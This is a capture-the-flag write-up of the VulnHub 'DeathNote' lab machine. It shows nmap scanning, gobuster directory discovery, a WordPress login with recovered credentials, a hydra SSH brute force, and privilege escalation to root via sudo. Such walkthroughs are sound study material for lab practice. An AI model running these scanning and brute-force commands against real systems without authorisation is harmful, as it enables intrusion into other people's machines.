---
title: DeathNote-1 - Writeup
author: Elman Alizadeh
date: 2022-05-15 11:35:00 +0800
categories: [ctf, VulnHub]
tags: [vulnhub, deathnote]
---

Today we will take a look at Vulnhub: DeathNote. My goal in sharing this writeup is to show you the way if you are in trouble. Please try to understand each step and take notes.

![Desktop View]({{ "/assets/img/vuln-deathnote/1.jpg" | relative_url }})

## Network scan

Command: Command: sudo nmap -p- -sV -sC -oN nmap/open — open 192.168.0.109

![Desktop View]({{ "/assets/img/vuln-deathnote/19.png" | relative_url }})

## Web pages    

If there is such a problem when looking at the page, do it

![Desktop View]({{ "/assets/img/vuln-deathnote/1.png" | relative_url }})

Command: sudo nano /etc/hosts

![Desktop View]({{ "/assets/img/vuln-deathnote/2.png" | relative_url }})

Result

![Desktop View]({{ "/assets/img/vuln-deathnote/3.png" | relative_url }})

Let’s take notes of everything you need on the page. (name, weird sentence, everything we will use)

```console
kira
light yagami
Soichiro Yagami
```

If we press the hint button, we will come across a sentence.


![Desktop View]({{ "/assets/img/vuln-deathnote/4.png" | relative_url }})

L’s comment is below. let’s note

```console
my fav line is iamjustic3
```

## Gobuster

Find Site Directories

Command: Command: gobuster dir -u http://192.168.0.109 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt

![Desktop View]({{ "/assets/img/vuln-deathnote/5.png" | relative_url }})

Let’s look at the robots.txt extension

![Desktop View]({{ "/assets/img/vuln-deathnote/6.png" | relative_url }})

We found a new directory.

![Desktop View]({{ "/assets/img/vuln-deathnote/7.png" | relative_url }})

.jpg file may be damaged. Let’s download.

Command: wget http://deathnote.vuln/important.jpg

Command: cat important.jpg

![Desktop View]({{ "/assets/img/vuln-deathnote/8.png" | relative_url }})

Indicates that the password will be in the Indian button on the site. So the password is ‘iamjustic3’

The entry can also be ‘kira’ or ‘l’. Let’s check.

## Wordpress

Url- http://deathnote.vuln/wordpress/wp-login.php

user: kira pass: iamjustic3

There is such a .txt file on the media page.

![Desktop View]({{ "/assets/img/vuln-deathnote/9.png" | relative_url }})

Url- http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt

![Desktop View]({{ "/assets/img/vuln-deathnote/10.png" | relative_url }})

They look like a password. Let’s mark it as pass.txt.

Let’s add them to User.txt.

```console
kira
l
light
Soichiro
```

Let’s attack ssh.

## Hydra

Command: hydra -L user.txt -P pass.txt ssh://192.168.0.109 -V -t 4

![Desktop View]({{ "/assets/img/vuln-deathnote/11.png" | relative_url }})

user- l pass- death4me

## Ssh

Command: ssh l@192.168.0.109

![Desktop View]({{ "/assets/img/vuln-deathnote/12.png" | relative_url }})

it was brainfuck

Let’s decode

[BrainFuck](https://www.splitbrain.org/_static/ook/)

![Desktop View]({{ "/assets/img/vuln-deathnote/13.png" | relative_url }})

The /opt folder also has hints that will be useful to us

![Desktop View]({{ "/assets/img/vuln-deathnote/14.png" | relative_url }})

Let’s decode

[CyberChef](https://gchq.github.io/CyberChef/)

![Desktop View]({{ "/assets/img/vuln-deathnote/15.png" | relative_url }})

## Kira

Command: su kira

![Desktop View]({{ "/assets/img/vuln-deathnote/16.png" | relative_url }})

Let’s decode in cyberchef again

![Desktop View]({{ "/assets/img/vuln-deathnote/17.png" | relative_url }})

Let’s look at the / var folder

Command: cd /var

Commdn: cat misa

```console
it is toooo late for misa
```

## Root

let’s check the privileges

Command: sudo -l

```console
(ALL : ALL) ALL
```

This means that we have authority over everything. Let’s root

Command: sudo su

![Desktop View]({{ "/assets/img/vuln-deathnote/18.png" | relative_url }})

### And now we are the root


![Desktop View]({{ "/assets/img/vuln-deathnote/1.gif" | relative_url }})

“If you have any questions or comments, please do not hesitate to write. Have a good days”









